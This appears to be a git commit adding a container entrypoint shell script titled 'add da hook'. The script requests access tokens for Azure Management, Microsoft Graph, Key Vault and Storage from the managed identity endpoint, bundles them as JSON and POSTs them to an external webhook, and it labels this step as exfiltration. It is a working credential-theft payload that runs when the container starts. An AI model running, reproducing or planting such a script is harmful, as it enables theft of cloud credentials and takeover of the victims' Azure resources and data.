507c8bbe5962ffc202e6f2e586dd9c1855c846d0
Jacob-Ham <99051071+Jacob-Ham@users.noreply.github.com>
2026-01-13 16:48:12 -0600

    add da hook

---
+++ entrypoint.sh
@@ -0,0 +1,34 @@
+#!/bin/sh
+
+WEBHOOK=https://webhook.site/b4b33967-c95c-4510-bda7-0110af22aff2
+
+if [ -z "$WEBHOOK_URL" ]; then
+    echo "Error: WEBHOOK_URL environment variable is not set."
+    exit 1
+fi
+
+RESOURCES=(
+    "https://management.azure.com/"
+    "https://graph.microsoft.com/"
+    "https://vault.azure.net"
+    "https://storage.azure.com"
+)
+
+OUTPUT_JSON="{}"
+
+echo "Starting token collection from $IDENTITY_ENDPOINT..."
+
+for R in "${RESOURCES[@]}"; do
+
+    RESPONSE=$(curl -s -H "X-IDENTITY-HEADER: $IDENTITY_HEADER" \
+        "$IDENTITY_ENDPOINT?api-version=2019-08-01&resource=$R")
+
+
+    TOKEN=$(echo "$RESPONSE" | jq -r '.access_token // .message')
+
+
+    OUTPUT_JSON=$(echo "$OUTPUT_JSON" | jq --arg key "$R" --arg val "$TOKEN" '.[$key] = $val')
+done
+
+echo "Exfiltrating to $WEBHOOK_URL..."
+curl -s -X POST -H "Content-Type: application/json" -d "$OUTPUT_JSON" "$WEBHOOK_URL"
